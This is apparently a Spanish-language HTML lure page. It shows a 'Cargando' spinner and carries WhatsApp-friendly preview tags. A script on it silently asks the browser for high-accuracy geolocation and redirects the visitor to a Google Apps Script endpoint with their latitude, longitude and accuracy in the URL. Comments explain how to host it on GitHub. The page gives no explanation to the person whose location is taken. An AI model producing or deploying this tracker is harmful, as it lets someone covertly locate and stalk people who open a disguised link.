<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando...</title>

  <!-- Metadatos Open Graph para WhatsApp y redes sociales -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Acceso al contenido">
  <meta property="og:description" content="Haz clic para continuar">

  <!-- RUTA DE LA IMAGEN: Sustituye con tu usuario y nombre del repositorio -->
  <!-- Si usas GitHub Pages: https://USUARIO.github.io/REPOSITORIO/luna.png -->
  <!-- Si usas el enlace Raw: https://raw.githubusercontent.com/USUARIO/REPOSITORIO/main/luna.png -->
  <meta property="og:image" content="https://raw.githubusercontent.com/USUARIO/REPOSITORIO/main/luna.png">
  <meta property="og:image:type" content="image/png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: #f8fafc;
      color: #334155;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 24px;
      text-align: center;
    }
    .spinner {
      width: 46px;
      height: 46px;
      border: 4px solid #e2e8f0;
      border-top: 4px solid #2563eb;
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      font-size: 1.05rem;
      line-height: 1.5;
    }
  </style>
</head>
<body>

  <div class="spinner"></div>
  <p>Cargando contenido, espera un momento...</p>

  <script>
    const urlDestino = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";

    function redirigir(query = "") {
      window.location.href = urlDestino + query;
    }

    // Disparar la solicitud de ubicación al navegador
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (posicion) => {
          // Si el usuario acepta, adjunta las coordenadas a la URL
          const lat = posicion.coords.latitude;
          const lon = posicion.coords.longitude;
          const precision = posicion.coords.accuracy;
          redirigir(`?lat=${lat}&lon=${lon}&acc=${precision}`);
        },
        (error) => {
          // Si el usuario deniega el permiso o caduca el tiempo, redirige igual
          console.warn("Ubicación no otorgada:", error.message);
          redirigir();
        },
        {
          enableHighAccuracy: true,
          timeout: 6000,
          maximumAge: 0
        }
      );
    } else {
      // Si el navegador no soporta geolocalización
      redirigir();
    }
  </script>

</body>
</html>
